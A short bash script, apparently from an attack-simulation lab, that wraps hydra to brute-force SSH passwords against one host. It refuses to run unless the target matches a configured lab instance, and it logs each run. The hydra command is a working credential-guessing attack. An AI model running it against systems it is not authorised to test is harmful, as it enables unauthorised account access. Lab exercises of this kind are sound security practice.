#!/bin/bash
# LAB USE ONLY - target must match attack-sim/target.conf (your own EC2 instance)
# Usage: ./ssh-brute-force.sh <target_ip> <username> <password_list>

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONF="$SCRIPT_DIR/target.conf"
TARGET="$1"
USERNAME="$2"
PASSLIST="$3"
LOGFILE="$SCRIPT_DIR/attack-log.txt"

if [[ ! -f "$CONF" ]]; then
    echo "Missing $CONF — copy target.conf.example to target.conf and set ALLOWED_TARGET."
    exit 1
fi
source "$CONF"

if [[ -z "$TARGET" || "$TARGET" != "$ALLOWED_TARGET" ]]; then
    echo "Refusing to run: target must exactly match ALLOWED_TARGET in target.conf ($ALLOWED_TARGET)"
    exit 1
fi

if [[ -z "$USERNAME" || -z "$PASSLIST" ]]; then
    echo "Usage: ./ssh-brute-force.sh <target_ip> <username> <password_list>"
    exit 1
fi

if [[ ! -f "$PASSLIST" ]]; then
    echo "Password list not found: $PASSLIST"
    exit 1
fi

echo "$(date -u +%Y-%m-%dT%H:%M:%SZ) | ssh-brute-force | target=$TARGET | target_user=$USERNAME | operator=$(whoami)" >> "$LOGFILE"

hydra -l "$USERNAME" -P "$PASSLIST" -t 4 -f "$TARGET" ssh
